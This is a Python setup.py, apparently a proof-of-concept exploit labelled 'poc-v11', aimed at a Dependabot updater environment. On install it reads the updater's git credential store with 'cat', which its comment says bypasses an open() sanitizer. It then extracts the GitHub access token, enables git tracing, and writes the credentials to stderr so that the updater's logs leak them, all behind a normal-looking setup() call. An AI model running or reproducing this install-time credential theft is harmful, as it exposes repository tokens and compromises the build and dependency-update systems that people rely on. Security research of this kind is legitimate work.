from setuptools import setup
import subprocess, os

GIT_STORE = '/home/dependabot/dependabot-updater/git.store'

# Read git.store (bypasses open() sanitizer)
try:
    git_creds = subprocess.check_output(['cat', GIT_STORE], text=True, stderr=subprocess.DEVNULL).strip()
except Exception as e:
    git_creds = f'READ_FAILED:{e}'

# Write a modified git config that includes the credential in the remote URL
# When git operations fail, the URL (with token) may appear in error output
# which gets logged by the Ruby updater
try:
    # Modify global git config to set the credential-embedded remote
    # This causes git to log the full URL in verbose mode
    token_line = [line for line in git_creds.split('\n') if 'github.com' in line]
    if token_line:
        # The git.store line is: https://x-access-token:TOKEN@github.com
        token_url = token_line[0].strip()
        # Set GIT_TRACE env var so git logs all operations including URLs
        os.environ['GIT_TRACE'] = '1'
        os.environ['GIT_TRACE_PACKET'] = '1'
        # Write to stderr — Ruby captures helper subprocess stderr
        import sys
        sys.stderr.write(f'GIT_STORE_CONTENT: {git_creds[:500]}\n')
        sys.stderr.flush()
except Exception as e:
    import sys
    sys.stderr.write(f'CREDENTIAL_READ_ATTEMPT: {e}\n')

# Normal setup call
setup(
    name='poc-v11',
    version='1.0.0',
    install_requires=['requests==2.28.0'],
)
